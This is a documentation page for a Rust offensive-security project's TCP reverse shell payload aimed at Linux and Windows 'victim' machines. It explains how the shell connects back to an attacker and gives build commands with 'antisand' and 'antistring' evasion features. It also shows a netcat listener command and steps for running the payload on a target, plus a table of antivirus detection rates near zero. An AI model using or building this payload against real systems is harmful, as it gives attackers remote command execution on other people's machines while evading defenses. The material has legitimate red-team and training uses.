---
title: "TCP Reverse Shell"
datatable: true
---

# RCO: TCP Reverse Shell

[![TCP reverse shell version unavailable](https://img.shields.io/crates/v/tcp_reverse_shell?label=tcp_reverse_shell)](https://github.com/kmanc/remote_code_oxidation/tree/master/tcp_reverse_shell)

<div class="datatable-begin"></div>

Target OS | Demo
--------- | ----
Linux     | [![tcp_reverse_shell_linux](/assets/gifs/tcp_reverse_shell.gif)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/gifs/tcp_reverse_shell.gif)
Windows   | [![tcp_reverse_shell_windows](/assets/gifs/tcp_reverse_shell_windows.gif)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/gifs/tcp_reverse_shell_windows.gif)

<div class="datatable-end"></div>

## How it works

The reverse shells for both Linux and Windows work by establishing a [Transmission Control Protocol (TCP) session](https://www.scottklement.com/rpg/socktut/overview.html) from the victim machine to the attacking machine. Then a Terminal (Linux) or Command Prompt (Windows) process starts with its [standard input](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)), [standard output](https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)), and [standard error](https://en.wikipedia.org/wiki/Standard_streams#Standard_error_(stderr)) all assigned to the TCP session. This means that input commands and output results are read from and written to (respectively) the TCP stream.


## Using it

1.  *[Not shown in demo]* Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
and change the IP address and port to match the IP address of your attacking machine and the port you will use for a listener respectively
2.  *[Not shown in demo]* Compile the executable
    1.  For Linux targets
    ```commandline
    cargo build -p tcp_reverse_shell [antisand][,][antistring]] --release
    ```
    2.  For Windows targets
    ```commandline
    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell [antisand][,][antistring]] --release
    ```
3.  Start a netcat listener on the attacking machine on the same port you configured in step 1
```commandline
nc -nlvp 4444
```
4.  Execute the payload on the victim machine
5.  Return to the listener and enter desired commands for the victim machine to run


## Detection rates

<div class="datatable-begin"></div>

Target OS | Features                      | Detections                             | Screenshot
--------- | ----------------------------- | -------------------------------------- | ----------
Linux     | None                      | [0 / 62](https://www.virustotal.com/gui/file/ad0713b3fb39f1b4bb0128b3d427eb4caaced2b8d3e6442af0ee24f4225ca017) | [![tcp_reverse_shell_linux](/assets/images/linux/shell.png)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/images/linux/shell.png)
Windows   | `antisand,antistring`     | [2 / 70](https://www.virustotal.com/gui/file/5f994446de4334830bcb18a5bb9da9e4911a64ccb087cff18fd051660064103d) | [![tcp_reverse_shell_windows_antisand_antistring](/assets/images/windows/shell_antisand_antistring.png)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/images/windows/shell_antisand_antistring.png)
Windows   | `antisand`                | [1 / 70](https://www.virustotal.com/gui/file/373a55b6e2818b9b8914b10aee02ecc72cd72db0292c0e0f42142fb0a73a7599) | [![tcp_reverse_shell_windows_antisand](/assets/images/windows/shell_antisand.png)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/images/windows/shell_antisand.png)
Windows   | None                      | [0 / 70](https://www.virustotal.com/gui/file/cd3f61abed9513e139150c28492db516763888f68fde60b338393d1ebd54d56a) | [![tcp_reverse_shell_windows](/assets/images/windows/shell.png)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/images/windows/shell.png)
Windows   | `antistring`              | [0 / 70](https://www.virustotal.com/gui/file/e5fcdc8ae700525ccde8275c11d01371f24c37463875f221c3073ef4475e9ca9) | [![tcp_reverse_shell_windows_antistring](/assets/images/windows/shell_antistring.png)](https://raw.githubusercontent.com/kmanc/remote_code_oxidation/main/docs/assets/images/windows/shell_antistring.png)

<div class="datatable-end"></div>
